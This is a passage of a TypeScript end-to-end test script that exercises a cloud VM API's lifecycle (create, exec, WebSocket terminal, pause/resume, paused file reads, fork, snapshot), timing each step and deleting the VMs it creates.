/**
 * A timed end-to-end journey through NEXT Cloud's cmux VM API (vm.cmux.dev,
 * vm-staging.cmux.dev; workers/cmux-vm/openapi.json), the way a headless
 * client drives one machine:
 *
 *   health -> create -> running -> listed -> first exec -> agent CLIs present
 *   -> named terminal over WebSocket (first prompt) -> a background process
 *   -> pause -> paused -> resume -> running -> the background process survived
 *   (memory kept) -> pause again -> an exec with no resume wakes the VM and finds
 *   the process still alive
 *   -> the same terminal
 *   reattaches and runs a command -> delete -> 404 -> gone from the list.
 *
 * It lives outside workers/cmux-vm so changing it never redeploys the Worker
 * (cmux-vm.yml deploys staging on every push under workers/cmux-vm/**).
 *
 * Every step is timed. The run prints one JSON summary and writes it to
 * --result-file, success or failure, so a workflow can publish the numbers.
 * The VM it creates is deleted by its exact id at the end, also on failure,
 * and carries idleTimeoutSeconds 300 and autoDeleteSeconds 3600 as backstops.
 * It deletes only the VM it made: the API has no per-caller filter, so a VM a
 * killed run leaves behind is reaped by its own autoDeleteSeconds, never by a
 * sweep that could reach another caller's machine. Keys are read from the
 * environment and never printed.
 *
 *   CMUX_VM_DOGFOOD_URL=https://vm-staging.cmux.dev \
 *   CMUX_VM_SMOKE_API_KEY=cmuxvm_sk_... bun scripts/cmux-next/cloud-vm-dogfood-journey.ts --result-file out.json
 *
 * With no tenant key, CMUX_VM_SMOKE_SERVICE_KEY and CMUX_VM_SMOKE_SERVICE_TEAM
 * (a service key limited to role=chief VMs on one dev/test team, as production
 * holds) run the same journey on a role=chief VM.
 *
 * --auth session runs it as the agent test account's Stack session instead
 * (CMUX_DOGFOOD_STACK_EMAIL / CMUX_DOGFOOD_STACK_PASSWORD; staging only), with
 * every scope but admin: the paused-read leg needs vm:files, which the staging
 * smoke key was not issued (run 45856090047 skipped the leg for it).
 *
 * --lifecycle adds the agent-VM lifecycle leg (cmux-platform
 * docs/agent-vm-lifecycle.md), each verb through the API and, with --cmux PATH
 * (or CMUX_PATH), through the `cmux vm` CLI too:
 *
 *   a file written before pause is read after resume (disk kept), and after
 *   stop and start; fork (the copy has the file); snapshot; a new VM from the
 *   snapshot (has the file); snapshot delete; delete. Then the three ways a VM
 *   goes away with no caller left: autoDeleteSeconds 0 (deleted once it stops
 *   running), a VM deleting itself with its agent key from inside, and an
 *   agent key's revoke (the session's end) deleting the key's VMs at once.
 *
 * Every VM, snapshot and agent key it makes is deleted by exact id at the end.
 *
 * --paused-reads adds the paused-read leg (cmuxterm-hq RFD 0144 piece 2, RFD 0163 pick 1: "publish resume p95 and
 * paused-read p95"): before the pause it writes a 10 x 20 file tree, and while the VM is paused it times, through the
 * files routes and with no resume, a folder listing (GET files/entries) and a file open (GET files/content), n = 30
 * each, and a whole-tree search, n = 5: one GET files/search answered from the replica the worker seeds right after
 * the pause (POST files/replica, timed once), beside one search the old way for the before (list every folder, read
 * every file, find the one needle; about 211 reads). The VM must still
 * be paused after every batch and the resume after it must answer 200 (a VM that woke answers 409), so a run that
 * passes woke it 0 times. A key without vm:files is a note and the leg is skipped.
 *
 * --egress-allowlist adds the egress red team (RFD sandboxing-and-lockdown): a VM made with
 * initialNetwork.egress {mode: "allowlist", presets: [anthropic, openai, github, npm, pypi]} must still reach
 * api.anthropic.com and github.com, and must fail to POST a marker to an outside host or a raw IP (v4 and v6).
 *
 * --npm-bench times the lock against no lock (ask-4774198626, Leo: "what about if someone wants to lock down a vm?
 * lock down their app?"): two VMs at once, one registry-only (initialNetwork.egress {mode: "allowlist", presets:
 * [npm]}, what `cmux vm new --egress-allow npm` makes) and one with public egress, each runs the same big
 * `npm install` with a new empty cache, NPM_BENCH_ROUNDS times in turn. The leg records every wall time, each side's
 * median and the locked minus unlocked delta; the locked VM must also fail to reach example.com. A delta over
 * NPM_BENCH_BUDGET_MS (2000) fails the leg.
 */
import { randomBytes } from "node:crypto";
import { spawn } from "node:child_process";
import { writeFileSync } from "node:fs";
import { type StackVmSession, stackVmSession } from "./stack-vm-session.ts";

const argv = process.argv.slice(2);
const option = (name: string): string | undefined => {
  const index = argv.indexOf(name);
  return index >= 0 ? argv[index + 1] : undefined;
};
const skipSleep = argv.includes("--skip-sleep");
const lifecycle = argv.includes("--lifecycle");
const egressAllowlist = argv.includes("--egress-allowlist");
const pausedReads = argv.includes("--paused-reads");
const npmBench = argv.includes("--npm-bench");
const cmuxPath = option("--cmux") ?? process.env["CMUX_PATH"] ?? "";
// The headless VM CLI (workers/cmux-vm/cli, binary cmux-vm): the same library `cmux vm` links in process, for a run
// whose cmux has no `vm` scope yet (the public cmux is built from main; `cmux vm` is on feat-cmux-next).
const cmuxVmPath = option("--cmux-vm") ?? "";
const cliPath = cmuxVmPath !== "" ? cmuxVmPath : cmuxPath;
/** `cmux vm WORD` -> the headless CLI's own word for it (cmux-tui cli/vm.rs maps the same: new -> create, rm -> delete). */
const cliArgv = (args: string[]): string[] => {
  if (cmuxVmPath === "") return ["vm", ...args];
  const [word, ...rest] = args;
  return [word === "new" ? "create" : word === "rm" ? "delete" : (word ?? ""), ...rest];
};
const resultFile = option("--result-file");
const base = option("--url") ?? process.env["CMUX_VM_DOGFOOD_URL"] ?? "";
// --auth session: the agent test account's Stack session (stack-vm-session.ts), every scope but admin, so the
// paused-read leg (vm:files) and the terminal legs (vm:terminal) do not hang on a stored key's scopes.
const useSession = option("--auth") === "session";
const tenantKey = useSession ? "" : process.env["CMUX_VM_SMOKE_API_KEY"] ?? "";
const serviceKey = useSession ? "" : process.env["CMUX_VM_SMOKE_SERVICE_KEY"] ?? "";
const serviceTeam = useSession ? "" : process.env["CMUX_VM_SMOKE_SERVICE_TEAM"] ?? "";
const useService = tenantKey === "" && serviceKey !== "" && serviceTeam !== "";
if (base === "") {
  console.error("needs --url (or CMUX_VM_DOGFOOD_URL)");
  process.exit(2);
}
const origin = new URL(base);
if (origin.protocol !== "https:" || origin.pathname !== "/") {
  console.error("the VM API URL must be an https origin");
  process.exit(2);
}
let sessionAuth: StackVmSession | null = null;
if (useSession) {
  const email = process.env["CMUX_DOGFOOD_STACK_EMAIL"] ?? "";
  const password = process.env["CMUX_DOGFOOD_STACK_PASSWORD"] ?? "";
  if (email === "" || password === "") {
    console.error("--auth session needs CMUX_DOGFOOD_STACK_EMAIL and CMUX_DOGFOOD_STACK_PASSWORD (the agent test account)");
    process.exit(2);
  }
  try {
    sessionAuth = await stackVmSession(origin.origin, email, password);
  } catch (error) {
    console.error(`--auth session: ${error instanceof Error ? error.message : String(error)}`);
    process.exit(2);
  }
  if (process.env["GITHUB_ACTIONS"] === "true") console.log(`::add-mask::${sessionAuth.access}`);
}
const bearer = sessionAuth ? sessionAuth.access : useService ? serviceKey : tenantKey;
const teamHeaders: Record<string, string> = sessionAuth ? { "x-cmux-team-id": sessionAuth.team } : useService ? { "x-cmux-team-id": serviceTeam } : {};
if (bearer === "") {
  console.error("needs CMUX_VM_SMOKE_API_KEY, or CMUX_VM_SMOKE_SERVICE_KEY with CMUX_VM_SMOKE_SERVICE_TEAM, or --auth session");
  process.exit(2);
}

const runId = process.env["GITHUB_RUN_ID"] ? `${process.env["GITHUB_RUN_ID"]}-${process.env["GITHUB_RUN_ATTEMPT"] ?? "1"}` : `local-${Date.now()}`;
const REQUEST_TIMEOUT_MS = 120_000;
const runStartedAt = performance.now();
const timings: Record<string, number> = {};
const notes: string[] = [];
const result: Record<string, unknown> = {};
let stage = "setup";
let vmId: string | null = null;
let cleanupState = "unverified";

const sleep = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
const note = (text: string) => {
  notes.push(text);
  console.error(`note: ${text}`);
};

async function timed<T>(name: string, work: () => Promise<T>): Promise<T> {
  stage = name;
  const startedAt = performance.now();
  try {
    return await work();
  } finally {
    timings[`${name}Ms`] = Math.round(performance.now() - startedAt);
    console.error(`step ${name} ${timings[`${name}Ms`]}ms`);
  }
}

type Reply = { status: number; body: unknown; text: string };

async function call(method: string, path: string, body?: unknown, headers: Record<string, string> = {}, timeoutMs = REQUEST_TIMEOUT_MS, token = bearer): Promise<Reply> {
  const response = await fetch(new URL(path, origin), {
    method,
    headers: {
      authorization: `Bearer ${token}`,
      ...(token === bearer ? teamHeaders : {}),
      ...(body === undefined ? {} : { "content-type": "application/json" }),
      ...headers,
    },
    body: body === undefined ? null : JSON.stringify(body),
    signal: AbortSignal.timeout(timeoutMs),
  });
  const text = await response.text();
  let parsed: unknown = null;
  try {
    parsed = text === "" ? null : JSON.parse(text);
  } catch {
    parsed = text;
  }
  return { status: response.status, body: parsed, text };
}

const field = (value: unknown, name: string): unknown =>
  typeof value === "object" && value !== null && name in value ? Reflect.get(value, name) : undefined;

function expectStatus(reply: Reply, statuses: number[], what: string): unknown {
  if (!statuses.includes(reply.status)) throw new Error(`${what} expected ${statuses.join("/")}, got ${reply.status}: ${reply.text.slice(0, 400)}`);
  return reply.body;
}

const vmPath = (id: string) => `/v1/vms/${encodeURIComponent(id)}`;

async function waitForState(id: string, state: string, timeoutMs: number): Promise<void> {
  const deadline = Date.now() + timeoutMs;
  let last: unknown;
  for (;;) {
    const read = await call("GET", vmPath(id));
    expectStatus(read, [200], `GET ${vmPath("<vm>")}`);
    last = field(read.body, "state");
    if (last === state) return;
    if (Date.now() > deadline) throw new Error(`VM did not reach ${state} within ${timeoutMs}ms; last state ${String(last)}`);
    await sleep(2_000);
  }
}

async function stateSeries(id: string, from: number, targets: number[]): Promise<Array<{ atMs: number; status: string }>> {
  const series = [];
  for (const target of targets) {
    const wait = target - (performance.now() - from);
    if (wait > 0) await sleep(wait);
    const atMs = Math.round(performance.now() - from);
    const read = await call("GET", vmPath(id)).catch((error: unknown) => ({ status: 0, body: null, text: String(error) }));
    series.push({ atMs, status: String(field(read.body, "state") ?? `http ${read.status}`) });
  }
  return series;
}

async function exec(id: string, command: string, timeoutMs = 30_000): Promise<{ exitCode: unknown; stdout: string; stderr: string }> {
  const reply = await call("POST", `${vmPath(id)}/exec`, { command, timeoutMs }, {}, timeoutMs + 30_000);
  const body = expectStatus(reply, [200], "POST exec");
  return { exitCode: field(body, "exitCode"), stdout: String(field(body, "stdout") ?? ""), stderr: String(field(body, "stderr") ?? "") };
}

/**
 * One WebSocket terminal: opens (or reattaches to) `path`, types `line`, and
 * resolves with everything the VM printed once `expect` appears. Closing the
 * socket only detaches; the session stays on the VM.
 */
function terminalRound(path: string, line: string, expect: string, timeoutMs: number): Promise<{ output: string; created: unknown }> {
  const url = new URL(path, origin);
  url.protocol = "wss:";
  return new Promise((resolve, reject) => {
    // Bun's WebSocket takes request headers; the API authenticates the upgrade like any call.
    const socket = new WebSocket(url.toString(), { headers: { authorization: `Bearer ${bearer}`, ...teamHeaders } } as unknown as string[]);
    socket.binaryType = "arraybuffer";
    const decoder = new TextDecoder();
    let output = "";
    let created: unknown = null;
    let typed = false;
    const finish = (error?: Error) => {
      clearTimeout(timer);
      try {
        socket.close();
      } catch {}
      if (error) reject(error);
      else resolve({ output, created });
    };
    const timer = setTimeout(() => finish(new Error(`terminal: /${expect}/ did not appear within ${timeoutMs}ms; tail ${JSON.stringify(output.slice(-300))}`)), timeoutMs);
    const type = () => {
      if (typed) return;
      typed = true;
      socket.send(new TextEncoder().encode(`${line}\n`));
    };
    socket.addEventListener("message", (event) => {
      if (typeof event.data === "string") {
        const frame = (() => {
          try {
            return JSON.parse(event.data) as Record<string, unknown>;
          } catch {
            return {};
          }
        })();
        if (frame["type"] === "sessionInfo") {
          created = frame["created"];
          type();
        } else if (frame["type"] === "error") finish(new Error(`terminal error frame: ${String(frame["message"]).slice(0, 300)}`));
        else if (frame["type"] === "exited") finish(new Error(`terminal exited (${String(frame["exitCode"])}) before /${expect}/`));
        return;
      }
      output += decoder.decode(event.data as ArrayBuffer, { stream: true });
      if (output.includes(expect)) finish();
    });
    socket.addEventListener("open", () => setTimeout(type, 1_000));
    socket.addEventListener("error", () => finish(new Error("terminal WebSocket failed to open or broke")));
    socket.addEventListener("close", (event) => {
      if (!output.includes(expect)) finish(new Error(`terminal closed (${event.code}) before /${expect}/`));
    });
  });
}

// One cleanup for every caller (failure path, a signal, the deadline): a second
// caller awaits the first one's DELETE instead of exiting under it.
let cleanupRun: Promise<void> | null = null;
function cleanup(): Promise<void> {
  cleanupRun ??= runCleanup();
  return cleanupRun;
}
async function runCleanup(): Promise<void> {
  // The lifecycle leg's own resources first: snapshots, then agent keys (whose revoke deletes their VMs), then VMs.
  let leftover = false;
  for (const child of liveCli) child.kill("SIGKILL");
  const sweep = async (path: string, label: string) => {
    try {
      const deleted = await call("DELETE", path);
      if (deleted.status !== 204 && deleted.status !== 404 && deleted.status !== 200) throw new Error(`HTTP ${deleted.status}`);
      if (label === "vm" && (await call("GET", path)).status !== 404) throw new Error("still readable");
    } catch (error) {
      leftover = true;
      console.error(`cleanup_needed_${label}=${path.split("/").at(-1)} (${error instanceof Error ? error.message : String(error)})`);
    }
  };
  for (const key of [...cliCreationKeys]) {
    const creation = await call("GET", "/v1/vm-creations/by-key", undefined, { "idempotency-key": key }).catch(() => null);
    const id = creation === null ? undefined : field(creation.body, "id");
    if (typeof id === "string" && VM_ID.test(id)) lifecycleVms.add(id);
  }
  for (const id of [...lifecycleSnapshots]) await sweep(`/v1/snapshots/${encodeURIComponent(id)}`, "snapshot");
  for (const id of [...lifecycleAgentKeys]) await sweep(`/v1/agent-keys/${encodeURIComponent(id)}`, "agent_key");
  for (const id of [...lifecycleVms]) await sweep(vmPath(id), "vm");
  if (vmId === null) {
    if (leftover) cleanupState = "failed";
    else if (cleanupState === "unverified") cleanupState = "completed";
    return;
  }
  const id = vmId;
  try {
    const deleted = await call("DELETE", vmPath(id));
    const gone = await call("GET", vmPath(id));
    cleanupState = (deleted.status === 204 || deleted.status === 404) && gone.status === 404 && !leftover ? "completed" : "failed";
  } catch (error) {
    cleanupState = "failed";
    console.error(`cleanup failed: ${error instanceof Error ? error.message : String(error)}`);
  }
  if (cleanupState !== "completed") console.error(`cleanup_needed_vm=${id}`);
}

// ---- The agent-VM lifecycle leg (--lifecycle) ----

const lifecycleVms = new Set<string>();
const lifecycleSnapshots = new Set<string>();
const lifecycleAgentKeys = new Set<string>();
const VM_ID = /^vm_[0-9a-z]{26}$/;
// On the disk, not /tmp: the guest clears /tmp at boot, so a stop and start would lose it whatever the disk keeps.
const LIFECYCLE_FILE = "/var/tmp/cmux-lifecycle-marker";

async function lifecycleCreate(label: string, body: Record<string, unknown>, token = bearer): Promise<string> {
  const reply = await call(
    "POST",
    "/v1/vms",
    {
      displayName: `lifecycle ${label} ${runId}`.slice(0, 100),
      idleTimeoutSeconds: 300,
      autoDeleteSeconds: 3600,
      ...body,
      labels: { purpose: "lifecycle", run: runId.slice(0, 63), ...(useService && token === bearer ? { role: "chief" } : {}) },
    },
    { "idempotency-key": `lifecycle-${label}-${runId}` },
    5 * 60_000,
    token,
  );
  const id = field(expectStatus(reply, [201], `POST /v1/vms (${label})`), "id");
  if (typeof id !== "string" || !VM_ID.test(id)) throw new Error(`create (${label}) returned no VM id`);
  lifecycleVms.add(id);
  return id;
}

/** Reads the VM until it answers 404, timing it; false if it is still there at the deadline. */
async function waitGone(id: string, timeoutMs: number, token = bearer): Promise<boolean> {
  const deadline = Date.now() + timeoutMs;
  for (;;) {
    const read = await call("GET", vmPath(id), undefined, {}, REQUEST_TIMEOUT_MS, token);
    if (read.status === 404) {
      lifecycleVms.delete(id);
      return true;
    }
    if (Date.now() > deadline) return false;
    await sleep(5_000);
  }
}

/** The leg's VMs pause after 300 s without network traffic (the dev/test cap); a read wakes one first. */
async function awake(id: string): Promise<void> {
  const state = field((await call("GET", vmPath(id))).body, "state");
  if (state === "running") return;
  if (state === "paused" || state === "pausing") {
    if (state === "pausing") await waitForState(id, "paused", 3 * 60_000);
    // 409: something else (an exec, inbound traffic) woke it between the read and the resume.
    expectStatus(await call("POST", `${vmPath(id)}/resume`, undefined, {}, 5 * 60_000), [200, 409], "POST resume (wake)");
  }
  await waitForState(id, "running", 5 * 60_000);
}

async function readMarker(id: string): Promise<string> {
  await awake(id);
  return (await exec(id, `cat ${LIFECYCLE_FILE} 2>/dev/null || echo missing`)).stdout.trim();
}

/**
 * One `cmux vm ...` run of the CLI under test, with the journey's key in its environment. Asynchronous, so a signal
 * or the deadline can still run cleanup while it runs.
 */
function cli(args: string[], timeoutMs = 5 * 60_000): Promise<{ code: number; stdout: string; stderr: string; ms: number }> {
  const startedAt = performance.now();
  return new Promise((resolve) => {
    const child = spawn(cliPath, cliArgv(args), {
      env: { ...process.env, CMUX_VM_BASE_URL: origin.origin, CMUX_VM_API_KEY: bearer, ...(useService ? { CMUX_VM_TEAM_ID: serviceTeam } : {}) },
      stdio: ["ignore", "pipe", "pipe"],
    });
    let stdout = "";
    let stderr = "";
    child.stdout.on("data", (chunk: Buffer) => (stdout += chunk.toString()));
    child.stderr.on("data", (chunk: Buffer) => (stderr += chunk.toString()));
    liveCli.add(child);
    const timer = setTimeout(() => child.kill("SIGTERM"), timeoutMs);
    const done = (code: number) => {
      clearTimeout(timer);
      liveCli.delete(child);
      const ms = Math.round(performance.now() - startedAt);
      console.error(`cli cmux vm ${args.join(" ")} -> ${code} in ${ms}ms`);
      resolve({ code, stdout, stderr: stderr.replaceAll(bearer, "<key>"), ms });
    };
    child.on("error", (error) => {
      stderr += String(error);
      done(-1);
    });
    child.on("close", (code) => done(code ?? -1));
  });
}

/** Why the CLI under test cannot run `vm` verbs, or null when it can (`vm --help` answers without a scope error). */
async function cliLacksVm(): Promise<string | null> {
  const out = await cli(["--help"], 60_000);
  if (out.code === 0) return null;
  return /unknown resource scope/.test(out.stderr)
    ? `${cliPath} has no \`vm\` scope (${out.stderr.trim().slice(0, 120)})`
    : `${cliPath} vm --help exited ${out.code}: ${out.stderr.trim().slice(0, 160)}`;
}

/** CLI runs still going; cleanup stops them first, so none makes a VM after the sweep looked. */
const liveCli = new Set<ReturnType<typeof spawn>>();

/** The CLI cannot set autoDeleteSeconds, so a CLI VM whose answer was lost is found again by its idempotency key. */
const cliCreationKeys = new Set<string>();

async function cliJson(args: string[], what: string): Promise<unknown> {
  const out = await cli([...args, "--json"]);
  if (out.code !== 0) throw new Error(`cmux vm ${what} exited ${out.code}: ${out.stderr.slice(0, 400)}`);
  try {
    return JSON.parse(out.stdout);
  } catch {
    throw new Error(`cmux vm ${what} printed no JSON: ${out.stdout.slice(0, 200)}`);
  }
}

/** The paused-read leg's tree (module docs, --paused-reads): DIRS folders of FILES files each, one needle file. */
const PAUSED_TREE = { dirs: 10, files: 20 } as const;
const PAUSED_READ_N = 30;
const PAUSED_SEARCH_N = 5;
/** Searches the old way, one files read per folder and file: the before beside files/search's after. */
const PAUSED_CLIENT_WALK_N = 1;
const PAUSED_SEARCH_CONCURRENCY = 8;

const percentile = (samples: number[], p: number): number => {
  const sorted = [...samples].sort((a, b) => a - b);
  return sorted.length === 0 ? -1 : sorted[Math.max(0, Math.ceil((p / 100) * sorted.length) - 1)]!;
};
const stats = (samples: number[]) => ({
  n: samples.length,
  p50: Math.round(percentile(samples, 50) * 10) / 10,
  p95: Math.round(percentile(samples, 95) * 10) / 10,
  max: Math.round(Math.max(...samples) * 10) / 10,
});

/** Writes the leg's tree on the running VM; answers its absolute root and the needle. */
async function pausedTree(id: string): Promise<{ root: string; needle: string }> {
  const needle = `needle-${randomBytes(6).toString("hex")}`;
  const { dirs, files } = PAUSED_TREE;
  const script =
    `set -e; r="$HOME/paused-reads-${needle}"; ` +
    // Fixed two-digit names (seq -f %02g, not -w): -w pads to the widest number, so 10 folders were d0..d9 and the
    // needle's d04 never existed (run 45846190008 failed seeding: "d04/f07.txt: Directory nonexistent").
    `for d in $(seq -f %02g 0 ${dirs - 1}); do mkdir -p "$r/d$d"; for f in $(seq -f %02g 0 ${files - 1}); do ` +
    `yes "line of d$d/f$f.txt for the paused read leg" | head -n 40 > "$r/d$d/f$f.txt"; done; done; ` +
    `echo ${needle} >> "$r/d04/f07.txt"; sync; echo "$r"`;
  const out = await exec(id, script, 60_000);
  const root = out.stdout.trim().split("\n").at(-1) ?? "";
  if (out.exitCode !== 0 || !root.startsWith("/")) throw new Error(`paused-read tree answered ${JSON.stringify(out).slice(0, 300)}`);
  return { root, needle };
}

/** One files route call on the paused VM, timed; a 429 waits out its Retry-After and counts. */
async function pausedFilesCall(id: string, route: "entries" | "content", path: string, counts: { rateLimited: number }): Promise<{ ms: number; reply: Reply }> {
  for (;;) {
    const startedAt = performance.now();
    const reply = await call("GET", `${vmPath(id)}/files/${route}?path=${encodeURIComponent(path)}`);
    const ms = performance.now() - startedAt;
    if (reply.status !== 429) return { ms, reply };
    counts.rateLimited += 1;
    await sleep(2_000);
  }
}

async function pausedState(id: string): Promise<string> {
  return String(field(expectStatus(await call("GET", vmPath(id)), [200], "GET vm (paused reads)"), "state"));
}

/** The timed reads on the paused VM (module docs, --paused-reads). */
async function pausedReadsLeg(id: string, tree: { root: string; needle: string }, failed: string[]): Promise<void> {
  const out: Record<string, unknown> = { tree: { ...PAUSED_TREE, root: tree.root } };
  result["pausedReads"] = out;
  const counts = { rateLimited: 0 };
  const states: string[] = [];
  const probe = await call("GET", `${vmPath(id)}/files/entries?path=${encodeURIComponent(tree.root)}`);
  if (probe.status === 403) {
    note("the key lacks vm:files; the paused-read leg was skipped");
    out["skipped"] = "vm:files";
    return;
  }
  expectStatus(probe, [200], "GET files/entries on a paused VM");
  states.push(await pausedState(id));

  const dir = (i: number) => `${tree.root}/d${String(i % PAUSED_TREE.dirs).padStart(2, "0")}`;
  const listing: number[] = [];
  await timed("pausedListing", async () => {
    for (let i = 0; i < PAUSED_READ_N; i += 1) {
      const { ms, reply } = await pausedFilesCall(id, "entries", dir(i), counts);
      const entries = field(expectStatus(reply, [200], "GET files/entries (paused)"), "entries");
      if (!Array.isArray(entries) || entries.length !== PAUSED_TREE.files) throw new Error(`paused listing of ${dir(i)} answered ${reply.text.slice(0, 200)}`);
      listing.push(ms);
    }
  });
  states.push(await pausedState(id));

  const open: number[] = [];
  await timed("pausedOpen", async () => {
    for (let i = 0; i < PAUSED_READ_N; i += 1) {
      const name = `f${String(i % PAUSED_TREE.files).padStart(2, "0")}.txt`;
      const { ms, reply } = await pausedFilesCall(id, "content", `${dir(i)}/${name}`, counts);
      expectStatus(reply, [200], "GET files/content (paused)");
      if (!reply.text.startsWith(`line of d${String(i % PAUSED_TREE.dirs).padStart(2, "0")}/${name}`)) throw new Error(`paused open of ${name} answered ${reply.text.slice(0, 120)}`);
      open.push(ms);
    }
  });
  states.push(await pausedState(id));

  // The server search (RFD 0144 piece 2): seed the replica once, then each search is one request.
  const search: number[] = [];
  const sources: string[] = [];
  let hits: string[] = [];
  const seed = await timed("pausedSeed", async () => {
    const startedAt = performance.now();
    const reply = await call("POST", `${vmPath(id)}/files/replica?path=${encodeURIComponent(tree.root)}`, undefined, {}, 3 * 60_000);
    return { ms: performance.now() - startedAt, reply };
  });
  const seeded = seed.reply.status !== 404;
  if (seeded) {
    const body = expectStatus(seed.reply, [200], "POST files/replica (paused)") as Record<string, unknown>;
    out["seed"] = { ms: Math.round(seed.ms), files: body["files"], bytes: body["bytes"], complete: body["complete"], seedMs: body["seedMs"] };
    states.push(await pausedState(id));
    await timed("pausedSearch", async () => {
      for (let round = 0; round < PAUSED_SEARCH_N; round += 1) {
        const startedAt = performance.now();
        let reply: Reply;
        for (;;) {
          reply = await call("GET", `${vmPath(id)}/files/search?path=${encodeURIComponent(tree.root)}&query=${encodeURIComponent(tree.needle)}`);
          if (reply.status !== 429) break;
          counts.rateLimited += 1;
          await sleep(2_000);
        }
        search.push(performance.now() - startedAt);
        const body = expectStatus(reply, [200], "GET files/search (paused)") as Record<string, unknown>;
        sources.push(String(body["source"]));
        hits = [...new Set((body["matches"] as Array<{ path: string }>).map((m) => m.path.slice(tree.root.length + 1)))];
      }
    });
  } else {
    note("this cmux-vm has no files/replica (404): the search was timed the old way only");
  }
  states.push(await pausedState(id));

  const walk: number[] = [];
  let walkHits: string[] = [];
  let requests = 0;
  await timed("pausedSearchClientWalk", async () => {
    for (let round = 0; round < (seeded ? PAUSED_CLIENT_WALK_N : PAUSED_SEARCH_N); round += 1) {
      const startedAt = performance.now();
      const found: string[] = [];
      const files: string[] = [];
      const top = await pausedFilesCall(id, "entries", tree.root, counts);
      requests += 1;
      const dirs = (field(expectStatus(top.reply, [200], "GET files/entries (search root)"), "entries") as Array<{ name: string; kind: string }>)
        .filter((e) => e.kind === "directory").map((e) => `${tree.root}/${e.name}`);
      const pool = async <T>(items: T[], work: (item: T) => Promise<void>) => {
        let next = 0;
        await Promise.all(Array.from({ length: PAUSED_SEARCH_CONCURRENCY }, async () => {
          while (next < items.length) await work(items[next++]!);
        }));
      };
      await pool(dirs, async (d) => {
        const { reply } = await pausedFilesCall(id, "entries", d, counts);
        requests += 1;
        for (const e of field(expectStatus(reply, [200], "GET files/entries (search)"), "entries") as Array<{ name: string; kind: string }>) {
          if (e.kind === "file") files.push(`${d}/${e.name}`);
        }
      });
      await pool(files, async (f) => {
        const { reply } = await pausedFilesCall(id, "content", f, counts);
        requests += 1;
        expectStatus(reply, [200], "GET files/content (search)");
        if (reply.text.includes(tree.needle)) found.push(f.slice(tree.root.length + 1));
      });
      walk.push(performance.now() - startedAt);
      walkHits = found;
    }
  });
  states.push(await pausedState(id));

  out["listing"] = stats(listing);
  out["open"] = stats(open);
  const files = PAUSED_TREE.dirs * PAUSED_TREE.files;
  const clientWalk = { ...stats(walk), files, requestsPerSearch: Math.round(requests / Math.max(1, walk.length)), concurrency: PAUSED_SEARCH_CONCURRENCY, hits: walkHits };
  if (seeded) {
    out["search"] = { ...stats(search), files, requestsPerSearch: 1, sources, hits };
    out["searchClientWalk"] = clientWalk;
    // Every search after the seed must be the replica's: one from the disk means the seed did not hold.
    if (!sources.every((source) => source === "replica")) failed.push("pausedSearchNotReplica");
    if (walkHits.length !== 1) failed.push("pausedSearchHits");
  } else {
    out["search"] = clientWalk;
    hits = walkHits;
  }
  out["rateLimited"] = counts.rateLimited;
  out["statesDuring"] = states;
  out["stayedPaused"] = states.every((s) => s === "paused");
  if (hits.length !== 1) failed.push("pausedSearchHits");
  if (out["stayedPaused"] !== true) failed.push("pausedReadsWoke");
}

/** The API legs: each verb, with the disk proof across pause, stop, fork and snapshot. */
async function lifecycleApi(failed: string[]): Promise<void> {
  const marker = `lifecycle-${randomBytes(4).toString("hex")}`;
  const proofs: Record<string, unknown> = {};
  result["lifecycleApi"] = proofs;
  const source = await timed("lcCreate", () => lifecycleCreate("source", {}));
  await timed("lcRunning", () => waitForState(source, "running", 5 * 60_000));
  await timed("lcWriteFile", async () => {
    const out = await exec(source, `printf %s ${marker} > ${LIFECYCLE_FILE} && sync && cat ${LIFECYCLE_FILE}`);
    if (out.stdout.trim() !== marker) throw new Error(`write answered ${JSON.stringify(out).slice(0, 200)}`);
  });

  await timed("lcPause", async () => expectStatus(await call("POST", `${vmPath(source)}/pause`, undefined, {}, 3 * 60_000), [200], "POST pause"));
  await timed("lcPaused", () => waitForState(source, "paused", 3 * 60_000));
  await timed("lcResume", async () => expectStatus(await call("POST", `${vmPath(source)}/resume`, undefined, {}, 5 * 60_000), [200], "POST resume"));
  await timed("lcResumed", () => waitForState(source, "running", 3 * 60_000));
  proofs["fileAfterResume"] = (await readMarker(source)) === marker;

  await timed("lcStop", async () => expectStatus(await call("POST", `${vmPath(source)}/stop`, undefined, {}, 3 * 60_000), [200], "POST stop"));
  await timed("lcStopped", () => waitForState(source, "stopped", 5 * 60_000));
  await timed("lcStart", async () => expectStatus(await call("POST", `${vmPath(source)}/start`, undefined, {}, 5 * 60_000), [200], "POST start"));
  await timed("lcStarted", () => waitForState(source, "running", 5 * 60_000));
  proofs["fileAfterStopStart"] = (await readMarker(source)) === marker;

  const fork = await timed("lcFork", async () => {
    const reply = await call(
      "POST",
      `${vmPath(source)}/fork`,
      { displayName: `lifecycle fork ${runId}`.slice(0, 100), idleTimeoutSeconds: 300, autoDeleteSeconds: 3600, labels: { purpose: "lifecycle", run: runId.slice(0, 63), ...(useService ? { role: "chief" } : {}) } },
      { "idempotency-key": `lifecycle-fork-${runId}` },
      10 * 60_000,
    );
    const id = field(expectStatus(reply, [201], "POST fork"), "id");
    if (typeof id !== "string" || !VM_ID.test(id)) throw new Error("fork returned no VM id");
    lifecycleVms.add(id);
    return id;
  });
  await timed("lcForkRunning", () => waitForState(fork, "running", 5 * 60_000));
  proofs["fileInFork"] = (await readMarker(fork)) === marker;
  // The fork is its own disk: a write there does not reach the source.
  await exec(fork, `printf %s fork > ${LIFECYCLE_FILE}`);
  proofs["forkIsolated"] = (await readMarker(source)) === marker;

  await awake(source);
  const snapshotReply = await timed("lcSnapshot", () =>
    call("POST", `${vmPath(source)}/snapshots`, { displayName: `lifecycle ${runId}`.slice(0, 100), ttlSeconds: 3600, ...(useService ? { labels: { role: "chief" } } : {}) }, { "idempotency-key": `lifecycle-snap-${runId}` }, 10 * 60_000));
  if (snapshotReply.status === 403 && /snapshot:write/i.test(snapshotReply.text)) {
    note("the key lacks snapshot:write; the API snapshot legs were skipped");
    proofs["snapshot"] = "skipped: no snapshot:write";
  } else {
    const snapshotId = field(expectStatus(snapshotReply, [201], "POST snapshots"), "id");
    if (typeof snapshotId !== "string") throw new Error("snapshot returned no id");
    lifecycleSnapshots.add(snapshotId);
    const fromSnapshot = await timed("lcCreateFromSnapshot", () => lifecycleCreate("from-snapshot", { snapshotId }));
    await timed("lcFromSnapshotRunning", () => waitForState(fromSnapshot, "running", 5 * 60_000));
    proofs["fileInSnapshotVm"] = (await readMarker(fromSnapshot)) === marker;
